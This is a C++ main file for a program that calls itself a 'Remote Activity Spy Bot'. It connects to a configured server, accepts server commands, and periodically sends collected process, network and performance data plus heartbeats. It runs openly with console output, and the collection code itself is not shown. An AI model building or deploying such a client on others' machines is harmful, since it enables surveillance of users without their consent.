#include <Windows.h>
#include <ShlObj.h>
#include <iostream>
#include <memory>
#include <csignal>
#include <thread>
#include <chrono>
#include <atomic>
#include "NetworkClient.h"
#include "DataCollector.h"
#include "ConfigManager.h"

#pragma comment(lib, "shell32.lib")

// Global flag for graceful shutdown
std::atomic<bool> g_running(true);

/**
 * @brief Checks if the process is running with administrative privileges.
 * @return True if running as admin, false otherwise.
 */
bool IsRunningAsAdmin()
{
#ifdef _WIN32
    BOOL fIsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup))
    {
        if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsAdmin))
        {
            fIsAdmin = FALSE;
        }
        FreeSid(pAdministratorsGroup);
    }
    return fIsAdmin;
#else
    // On non-Windows systems, assume not running as root for this example.
    // A more robust solution would check the effective user ID.
    return false;
#endif
}

/**
 * @brief Signal handler for graceful shutdown
 * @param signal Signal number received
 */
void SignalHandler(int signal) {
    std::cout << "\nReceived signal " << signal << ". Shutting down gracefully..." << std::endl;
    g_running = false;
}

/**
 * @brief Display application banner and information
 */
void ShowBanner() {
    std::cout << "========================================" << std::endl;
    std::cout << "       Remote Activity Spy Bot         " << std::endl;
    std::cout << "           Version 1.0.0               " << std::endl;
    std::cout << "========================================" << std::endl;
    std::cout << std::endl;
}

/**
 * @brief Handle data received from server
 * @param data JSON data received from server
 */
void OnDataReceived(const std::string& data) {
    std::cout << "[SERVER] Received command: " << data << std::endl;
    
    // Parse and handle server commands here
    // For now, just acknowledge receipt
    if (data.find("ping") != std::string::npos) {
        std::cout << "[CLIENT] Responding to ping" << std::endl;
    }
}

/**
 * @brief Main application entry point
 * @param argc Argument count
 * @param argv Argument values
 * @return Exit code
 */
int main(int argc, char* argv[]) {
    if (IsRunningAsAdmin())
    {
        std::cerr << "[ERROR] This application should not be run with administrator privileges." << std::endl;
        return 1;
    }

    ShowBanner();
    
    // Set up signal handlers for graceful shutdown
    std::signal(SIGINT, SignalHandler);
    std::signal(SIGTERM, SignalHandler);
    
    try {
        // Load configuration
        ConfigManager& config = ConfigManager::GetInstance();
        if (!config.LoadConfig()) {
            std::cerr << "[ERROR] Failed to load configuration file" << std::endl;
            return 1;
        }
        
        std::cout << "[INFO] Configuration loaded successfully" << std::endl;
        std::cout << "[INFO] Server: " << config.GetServerIP() << ":" << config.GetServerPort() << std::endl;
        std::cout << "[INFO] Collection interval: " << config.GetCollectionInterval() << "s" << std::endl;
        
        // Create network client
        auto network_client = std::make_shared<NetworkClient>(
            config.GetServerIP(),
            config.GetServerPort()
        );
        
        // Set up data received callback
        network_client->SetDataReceivedCallback(OnDataReceived);
        
        // Initialize network client
        if (!network_client->Initialize()) {
            std::cerr << "[ERROR] Failed to initialize network client" << std::endl;
            return 1;
        }
        
        std::cout << "[INFO] Network client initialized" << std::endl;
        
        // Attempt to connect to server with retry logic
        bool connected = false;
        int retry_count = 0;
        int max_retries = config.GetRetryAttempts();
        
        while (!connected && retry_count < max_retries && g_running) {
            std::cout << "[INFO] Attempting to connect to server (attempt " 
                      << (retry_count + 1) << "/" << max_retries << ")" << std::endl;
            
            if (network_client->Connect()) {
                connected = true;
                std::cout << "[INFO] Successfully connected to server" << std::endl;
            } else {
                retry_count++;
                if (retry_count < max_retries) {
                    std::cout << "[WARN] Connection failed, retrying in 5 seconds..." << std::endl;
                    std::this_thread::sleep_for(std::chrono::seconds(5));
                }
            }
        }
        
        if (!connected) {
            std::cerr << "[ERROR] Failed to connect to server after " << max_retries << " attempts" << std::endl;
            return 1;
        }
        
        // Start listening for server data
        network_client->StartListening();
        
        // Create and configure data collector
        DataCollector collector(network_client);
        collector.ConfigureCollection(
            config.IsProcessCollectionEnabled(),
            config.IsNetworkCollectionEnabled(),
            config.IsPerformanceCollectionEnabled()
        );
        
        // Start data collection
        if (!collector.StartCollection(config.GetCollectionInterval())) {
            std::cerr << "[ERROR] Failed to start data collection" << std::endl;
            return 1;
        }
        
        std::cout << "[INFO] Data collection started" << std::endl;
        std::cout << "[INFO] Spy bot is now running. Press Ctrl+C to stop." << std::endl;
        
        // Main loop - keep application running
        while (g_running && network_client->IsConnected()) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            
            // Optional: Send heartbeat every 10 seconds
            static auto last_heartbeat = std::chrono::steady_clock::now();
            auto now = std::chrono::steady_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::seconds>(now - last_heartbeat);
            
            if (duration.count() >= 10) {
                std::string heartbeat = R"({"type":"heartbeat","timestamp":")" + 
                    std::to_string(std::time(nullptr)) + "\"}";
                network_client->SendData(heartbeat);
                last_heartbeat = now;
            }
        }
        
        // Cleanup
        std::cout << "[INFO] Stopping data collection..." << std::endl;
        collector.StopCollection();
        
        std::cout << "[INFO] Stopping network listening..." << std::endl;
        network_client->StopListening();
        
        std::cout << "[INFO] Disconnecting from server..." << std::endl;
        network_client->Disconnect();
        
        std::cout << "[INFO] Spy bot shutdown complete" << std::endl;
        
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Exception occurred: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
} 